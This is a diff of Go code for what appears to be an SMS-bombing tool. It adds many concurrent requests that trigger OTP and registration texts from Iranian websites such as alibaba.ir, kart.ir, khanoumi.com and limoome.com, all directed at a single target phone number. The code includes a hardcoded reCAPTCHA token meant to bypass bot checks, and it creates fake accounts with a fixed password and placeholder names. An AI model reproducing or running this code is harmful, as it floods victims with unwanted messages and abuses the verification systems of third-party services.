@@ -541,7 +541,53 @@ tasks <- func(c *http.Client) func() {
 }(client)
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-// --- www.1001kharid.com (POST, FORM) ---
+// ------ alibaba (تبدیل از پایتون به Go) ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "phoneNumber": "0" + getPhoneNumberNoZero(phone),
+        }
+        sendJSONRequest(c, ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
+    }
+}(client)
+
+// ------ okorosh (تبدیل از پایتون به Go) ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "mobile": "0" + getPhoneNumberNoZero(phone),
+            "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe",
+        }
+        sendJSONRequest(c, ctx, "https://my.okcs.com/api/check-mobile", payload, &wg, ch)
+    }
+}(client)
+
+// ------ https://kart.ir/api/auth/authenticate ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "username": phone,
+        }
+        sendJSONRequest(c, ctx, "https://kart.ir/api/auth/authenticate", payload, &wg, ch)
+    }
+}(client)
+
+// ------ https://accounts.khanoumi.com/account/login/init ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e")
+        formData.Set("loginIdentifier", phone)
+        formData.Set("loginSchemeName", "sms")
+        sendFormRequest(c, ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
+    }
+}(client)
+
+// ------ https://www.1001kharid.com/wp-admin/admin-ajax.php ------
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -567,7 +613,69 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// --- 70kala.ir (POST, FORM) ---
+// ------ https://1000gem.org/livewire/message/login-register ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        // این API نیاز به ساختار خاص (Livewire) دارد. ساده‌ترین راه ارسال phone در قالب JSON است:
+        payload := map[string]interface{}{
+            "updates": []map[string]interface{}{
+                {
+                    "type": "syncInput",
+                    "payload": map[string]interface{}{
+                        "id": "erab", "name": "phone", "value": phone,
+                    },
+                },
+                {
+                    "type": "callMethod",
+                    "payload": map[string]interface{}{
+                        "id": "0k13", "method": "sendsms", "params": []interface{}{},
+                    },
+                },
+            },
+        }
+        sendJSONRequest(c, ctx, "https://1000gem.org/livewire/message/login-register", payload, &wg, ch)
+    }
+}(client)
+
+// ------ https://www.hamrah-mechanic.com/api/v1/membership/otp ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "PhoneNumber": phone,
+            "landingPageUrl": "https://www.hamrah-mechanic.com/cars-for-sale/",
+            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
+            "prevDomainUrl": "https://www.google.com/",
+            "prevUrl": "https://www.hamrah-mechanic.com/cars-for-sale/",
+            "referrer": "https://www.google.com/",
+        }
+        sendJSONRequest(c, ctx, "https://www.hamrah-mechanic.com/api/v1/membership/otp", payload, &wg, ch)
+    }
+}(client)
+
+// ------ https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/CheckUserExists.php ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("username", phone)
+        formData.Set("type", "CheckUsername")
+        sendFormRequest(c, ctx, "https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/CheckUserExists.php", formData, &wg, ch)
+    }
+}(client)
+
+// ------ https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/register.php ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("password", "monsmain@")
+        sendFormRequest(c, ctx, "https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/register.php", formData, &wg, ch)
+    }
+}(client)
+
+// ------ https://70kala.ir/wp-admin/admin-ajax.php ------
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -579,22 +687,28 @@ tasks <- func(c *http.Client) func() {
         formData.Set("instance_id", "7b0048080e38e916af365b7a33363096")
         formData.Set("action", "digits_forms_ajax")
         formData.Set("type", "login")
-        formData.Set("digits_step_1_type", "")
-        formData.Set("digits_step_1_value", "")
-        formData.Set("digits_step_2_type", "")
-        formData.Set("digits_step_2_value", "")
-        formData.Set("digits_step_3_type", "")
-        formData.Set("digits_step_3_value", "")
-        formData.Set("digits_login_email_token", "")
-        formData.Set("digits_redirect_page", "//70kala.ir/?page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
-        formData.Set("digits_form", "3057f39e8c")
-        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
-        formData.Set("show_force_title", "1")
+        // بقیه فیلدها مقدار خاص ندارند
         sendFormRequest(c, ctx, "https://70kala.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
     }
 }(client)
 
-// --- geminja.com/login?type=register (FORM) ---
+// ------ https://www.onlinekala.ir/login?back=my-account ------
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("back", "my-account")
+        formData.Set("username", phone)
+        formData.Set("id_customer", "")
+        formData.Set("firstname", "مانس")
+        formData.Set("lastname", "مین")
+        formData.Set("action", "register")
+        formData.Set("ajax", "1")
+        sendFormRequest(c, ctx, "https://www.onlinekala.ir/login?back=my-account", formData, &wg, ch)
+    }
+}(client)
+
+// ------ https://geminja.com/login?type=register ------
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -602,13 +716,12 @@ tasks <- func(c *http.Client) func() {
         formData.Set("type", "register")
         formData.Set("regMobile", phone)
         formData.Set("dlr-register", "ثبت نام")
-        formData.Set("_dlr_mobits", "")
-        formData.Set("register", "")
+        formData.Set("_dlr_mobits", "register")
         sendFormRequest(c, ctx, "https://geminja.com/login?type=register", formData, &wg, ch)
     }
 }(client)
 
-// --- gooshi.online/site/api/v1/user/otp (JSON) ---
+// ------ https://gooshi.online/site/api/v1/user/otp ------
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -623,7 +736,7 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// --- vidovin.com (JSON) ---
+// ------ https://www.vidovin.com/Users/LoginPopup ------
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -634,101 +747,27 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// --- my.limoome.com/auth/check-mobile (JSON) ---
+// ------ https://my.limoome.com/auth/check-mobile ------
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
         payload := map[string]interface{}{
-            "mobileNumber": getPhoneNumberNoZero(phone),
+            "mobileNumber": strings.TrimPrefix(phone, "0"),
             "countryId": "1",
         }
         sendJSONRequest(c, ctx, "https://my.limoome.com/auth/check-mobile", payload, &wg, ch)
     }
 }(client)
 
-// --- my.limoome.com/api/auth/login/otp (JSON) ---
+// ------ https://my.limoome.com/api/auth/login/otp ------
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
         payload := map[string]interface{}{
-            "mobileNumber": getPhoneNumberNoZero(phone),
+            "mobileNumber": strings.TrimPrefix(phone, "0"),
             "country": "1",
         }
         sendJSONRequest(c, ctx, "https://my.limoome.com/api/auth/login/otp", payload, &wg, ch)
-    }
-}(client)
-
-// --- ws.alibaba.ir/api/v3/account/mobile/otp (JSON) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        headers := map[string]string{
-            "Host":            "ws.alibaba.ir",
-            "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
-            "Accept":          "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "ab-channel":      "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR",
-            "ab-alohomora":    "MTMxOTIzNTI1MjU2NS4yNTEy",
-            "Content-Type":    "application/json;charset=utf-8",
-            "Origin":          "https://www.alibaba.ir",
-            "Connection":      "keep-alive",
-            "Referer":         "https://www.alibaba.ir/hotel",
-        }
-        payload := map[string]interface{}{
-            "phoneNumber": "0" + getPhoneNumberNoZero(phone),
-        }
-        data, _ := json.Marshal(payload)
-        req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://ws.alibaba.ir/api/v3/account/mobile/otp", bytes.NewBuffer(data))
-        if err != nil {
-            ch <- http.StatusInternalServerError
-            return
-        }
-        for k, v := range headers {
-            req.Header.Set(k, v)
-        }
-        resp, err := c.Do(req)
-        if err != nil {
-            ch <- http.StatusInternalServerError
-            return
-        }
-        defer resp.Body.Close()
-        ch <- resp.StatusCode
-    }
-}(client)
-
-// --- my.okcs.com/api/check-mobile (JSON, captcha fix) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobile": "0" + getPhoneNumberNoZero(phone),
-            "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe",
-        }
-        headers := map[string]string{
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/json;charset=UTF-8",
-            "origin": "https://my.okcs.com",
-            "referer": "https://my.okcs.com/",
-            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33",
-            "x-requested-with": "XMLHttpRequest",
-        }
-        data, _ := json.Marshal(payload)
-        req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://my.okcs.com/api/check-mobile", bytes.NewBuffer(data))
-        if err != nil {
-            ch <- http.StatusInternalServerError
-            return
-        }
-        for k, v := range headers {
-            req.Header.Set(k, v)
-        }
-        resp, err := c.Do(req)
-        if err != nil {
-            ch <- http.StatusInternalServerError
-            return
-        }
-        defer resp.Body.Close()
-        ch <- resp.StatusCode
     }
 }(client)
 
